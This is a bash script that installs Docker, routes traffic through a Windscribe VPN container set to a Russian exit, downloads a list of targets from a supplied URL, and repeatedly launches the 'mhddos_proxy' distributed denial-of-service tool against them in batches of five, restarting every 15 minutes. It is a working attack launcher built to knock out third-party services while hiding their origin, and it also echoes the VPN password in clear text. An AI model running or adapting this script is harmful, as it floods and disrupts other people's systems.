#!/bin/bash -x

TIME="15s"

while getopts 'u:p:f:' flag; do
  case "${flag}" in
    u) windscribeUserName=${OPTARG};;
    p) windscribePassword=${OPTARG};;
    f) fileName=${OPTARG};;
  esac
done

echo $windscribeUserName
echo $windscribePassword
echo $fileName

if [ -x "$(command -v docker)" ]; then
    echo "Docker installed"
else
    apt-get update
    echo "Install docker"
    apt-get update

    apt-get -y install \
    ca-certificates \
    curl \
    gnupg \
    lsb-release

    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

    echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

  apt-get update

  apt-get -y install docker-ce docker-ce-cli containerd.io
fi



while :
do

  docker run --name vpn1 -e PUID=1000 -e PGID=1000 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe

  wget -O list.txt $fileName
  myarray=(`cat list.txt`)
  noofelements=${#myarray[*]}
  counter=0
  counterGroup=0
  execCommand=""
  while [ $counter -lt $noofelements ]
  do
    execCommand+=" ${myarray[$counter]}"
    counter=$(( $counter + 1 ))
    counterGroup=$(( $counterGroup + 1 ))

    randVpn=${vpns[RANDOM%2]}

    if [[ "$counterGroup" -eq 5 ]]; then
      counterGroup=0
      docker run --net=container:vpn1 -it --rm portholeascend/mhddos_proxy${execCommand}
      execCommand=""
    fi

    if [[ ${myarray[$counter]} == ${myarray[-1]} ]]; then
      counterGroup=0
      docker run --net=container:vpn1 -it --rm portholeascend/mhddos_proxy${execCommand}
      execCommand=""
    fi
  done

  sleep 15m

  docker rm -f $(docker ps -aq) >/dev/null 2>&1 || true
done
